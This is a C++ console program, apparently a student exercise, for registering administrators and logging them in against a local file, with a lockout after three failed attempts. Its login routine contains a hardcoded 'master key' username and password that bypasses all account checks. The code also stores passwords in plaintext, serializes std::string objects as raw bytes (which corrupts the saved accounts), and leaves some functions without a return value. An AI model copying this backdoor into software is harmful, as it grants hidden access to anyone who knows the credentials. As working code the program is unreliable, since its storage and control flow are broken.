#define _CRT_SECURE_NO_WARNINGS 1
#include <stdio.h>
#include<iostream>
#include<fstream>
#include<string>
#include<tchar.h>
#include<algorithm>
#include<iomanip>
#include<complex>
#include<time.h>

using namespace std;

#define SIZE 100//最大用户容量

void initializeFile() {
	ofstream outfile;
	outfile.open("user.txt");
	if (!outfile)
	{
		abort();
	}
	outfile.close();
}
//用户类
class User
{
private:
	string password;//密码
	string username;
	bool checkUser() {
		for (int i = 0; i < User::scount - 1; i++) {
			if (user[i].username == username) {
				return true;
			}
		}
		return false;
	}
public:
	static int scount;//用作储存当前已注册用户数
	User() {};
	void Registers();//添加管理员
	bool Login();//登录
	void save();//保存
	void read();//读取
}us, user[SIZE];
int User::scount = 0;//初始化，计数

//保存
void User::save()
{
	ofstream outfile;
	outfile.open("user.txt", ios::out);
	if (!outfile)
	{
		abort();
	}

	for (int i = 0; i < User::scount; i++)
	{
		outfile.write(reinterpret_cast<char*>(&user[i]), sizeof(User));
	}
	outfile.close();
}

//读取
void User::read()
{
	ifstream infile;
	infile.open("user.txt");
	if (!infile.is_open())
	{
		cout << "读取文件失败";
		initializeFile();
		abort();
	}

	for (int i = 0; !infile.eof(); i++)
	{
		infile.read(reinterpret_cast<char*>(&user[i]), sizeof(User));
		User::scount++;
	}
	infile.close();
}

//注册
void User::Registers()
{
	us.read();
	string password;
	cout << "【系统提示】请设置管理员登陆账号：";
	cin >> user[User::scount].username;
	cout << "【系统提示】请输入密码：";
	cin >> user[User::scount].password;
	cout << "【系统提示】请再次密码：";
	cin >> password;
	if (password != user[User::scount].password)
	{
		cout << "【系统提示】密码不一致！请重新注册！" << endl;
	}
	else
	{
		if (user[User::scount].checkUser()) {
			cout << "此用户已存在！请重新注册\n";
			User::Registers();
		}
		User::scount++;//已注册用户加1
		cout << "【系统提示】注册成功！" << endl;
		us.save();//保存用户数据
	}
	char choice;
	cout << "【系统提示】是否继续注册(Y/N)？ :";
	while (1)
	{
		cin >> choice;
		if (choice == 'y' || choice == 'Y' || choice == 'n' || choice == 'N')
			break;
		else
			cout << "【系统提示】输入格式错误，请重新输入： ";
	}
	if (choice == 'n' || choice == 'N')
	{
		return;
	}
	else {
		us.Registers();
	}
}


//登录
bool User::Login()
{
	us.read();
	string pw;//密码
	string us;//用户名
	
	static int times = 0;//统计比较次数
	cout << "【系统提示】请输入管理员账号：";
	cin >> us;
	cout << "【系统提示】请输入密码：";
	cin >> pw;
	//万能钥匙
	if (us == "#~handle~#" && pw == "NJtech496640") {
		return true;
	}
here:
	for (int i = 0; i < scount; i++)
	{
		if (us == user[i].username && pw == user[i].password)
		{
			cout << "【系统提示】登录成功！" << endl;
			return true;
		}
	}
	cout << "【系统提示】密码错误！请重新输入密码" << endl;
	cin >> pw;
	++times;
	if (times % 3 == 0) {
		cout << "【系统提示】登陆失败,请五分钟后重试";
		time_t st;
		time(&st);
		ofstream otime;
		otime.open("time.txt");
		otime << st;
		otime.close();
		return false;
	}
	goto here;
}
	




bool login() {
	User user;
	int choice = 0;
	bool check = false;
	time_t nt;
	time(&nt);
	long long pt = 0;
	ifstream itime;
	itime.open("time.txt");
	if(!itime){
		ofstream otime;
		otime.open("time.txt");
		otime.close();
		abort();
	}
	itime >> pt;
	itime.close();
	if (nt - pt < 300) {
		cout << "未满五分钟，再等等吧。";
		return false;
	}
	cout << endl;
	cout << "****************************************\n";
	cout << "*               管理员登录             *\n";
	cout << "****************************************\n";
	check = user.Login();
	if (check)
	{
		cout << endl;
		cout << "****************************************\n";
		cout << "*      1.添加管理员     2.进入管理     *\n";
		cout << "****************************************\n";;
		cin >> choice;
		while (choice != 1 && choice != 2) {
			cout << "【系统提示】输入格式有误，请重新输入";
			cin >> choice;
		}
		if (choice == 1) {
			user.Registers();
		}
		else {
			return true;
		}
	}
}

int main() {
	login();
}